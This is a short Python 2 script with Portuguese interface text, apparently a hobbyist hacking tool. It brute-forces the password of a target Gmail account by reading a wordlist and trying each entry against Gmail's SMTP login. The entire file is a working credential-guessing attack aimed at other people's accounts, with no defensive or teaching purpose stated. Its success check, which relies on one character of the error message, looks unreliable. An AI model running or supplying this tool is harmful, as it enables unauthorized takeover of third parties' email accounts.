#!/usr/bin/python2

'''CRIADO POR WINVASOR'''
 
import re
import sys,os
import random
import smtplib
from os import system

verde = '\033[32m'
A = '\033[33m'
AZ = '\033[31m'

def wel():
   
   system('clear')

   print  '+=========================================+'
   print  '|..........' + AZ + '  GMAIL  --  Brute '+A+' ...........| '
   print  '+-----------------------------------------+\n'


wel()
print(AZ +'\033[05m!!! O Gmail Tem Protecao contra Brute-Force Entao isso pode nao funcionar!!!\n\033[25m' + A)
file_path = raw_input('INSIRA A WORDLIST :')
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
print('Wordlist tem : ' + str(len(pass_list)) +' senhas')
def login():
      pass_file = open(file_path,'r')
      pass_list = pass_file.readlines()
      i = 0
      user_name = raw_input('GMAIL DO ALVO :')
      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
      server.ehlo()
      for password in pass_list:
         i = i + 1
         print str(i) + '/' + str(len(pass_list))
         try:
            server.login(user_name, password)
            wel()
            print(verde)
            print("\n\n[+] Senha Correta ==> {}".format(password))
            print(A)
            
            break
         except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if error[14] == '<':
               wel()
               print(verde)
               print("\n\n[+] Senha Correta ==> {}".format(password))
               print(A)

               break
            else:
               print '[!] SENHA NAO EXISTE => ' + password
login()
